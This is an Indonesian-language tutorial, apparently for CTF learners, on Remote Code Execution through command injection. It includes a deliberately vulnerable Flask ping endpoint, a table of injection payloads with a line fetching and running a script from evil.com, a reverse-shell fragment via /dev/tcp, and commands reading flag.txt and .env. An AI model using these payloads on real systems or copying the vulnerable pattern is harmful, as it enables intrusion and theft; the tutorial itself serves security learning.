# 💣 Remote Code Execution (RCE)

## 📌 Apa itu RCE?

**Remote Code Execution (RCE)** adalah kerentanan yang memungkinkan penyerang untuk **menjalankan perintah sistem (command)** dari jarak jauh melalui aplikasi web.

Jika berhasil dieksploitasi, penyerang bisa menjalankan perintah seperti:
```bash
ls
cat flag.txt
whoami
````

…bahkan hingga mengakses shell atau mengambil alih server sepenuhnya.

---

## ⚠️ Contoh Sederhana

Contoh aplikasi Flask yang rentan:

```python
@app.route("/ping")
def ping():
    ip = request.args.get("ip")
    os.system("ping -c 1 " + ip)
    return "Pinged " + ip
```

Jika kita akses:

```
/ping?ip=127.0.0.1
```

Maka server menjalankan:

```
ping -c 1 127.0.0.1
```

Namun jika kita akses:

```
/ping?ip=127.0.0.1;ls
```

Maka server menjalankan:

```
ping -c 1 127.0.0.1;ls
```

➡️ `ls` akan ikut dijalankan! Inilah contoh **Command Injection → RCE**.

---

## 💥 Dampak dari RCE

* Membaca file penting (misalnya `flag.txt`, `.env`, `database.conf`)
* Membuat koneksi keluar (reverse shell)
* Menulis file baru (upload backdoor)
* Menghapus file penting
* Kendali penuh atas server (privilege escalation)

---

## 🧨 Contoh Payload Umum

| Payload                     | Keterangan                |                              |
| --------------------------- | ------------------------- | ---------------------------- |
| `127.0.0.1; whoami`         | Menjalankan `whoami`      |                              |
| `127.0.0.1 && ls`           | Menampilkan isi folder    |                              |
| \`127.0.0.1                 | cat flag.txt\`            | Membaca file                 |
| `127.0.0.1$(sleep 5)`       | Menguji delay (blind RCE) |                              |
| \`\$(curl evil.com/shell.sh | sh)\`                     | Menjalankan script dari luar |

---

## 🧠 Teknik Lanjutan

* **Blind RCE**: Tidak ada output, tapi efeknya bisa dilihat dari delay, request, atau perubahan server.
* **Chained with LFI**: Upload file berisi command, lalu trigger eksekusi via LFI.
* **Webshell**: Ubah RCE jadi akses interaktif shell (misalnya pakai `bash -i >& /dev/tcp/...`).

---

## 🧪 Tips Deteksi

* Coba input `127.0.0.1; whoami`
* Perhatikan waktu respon saat pakai `sleep 5` → indikasi blind RCE
* Lihat apakah hasil perintah muncul di output
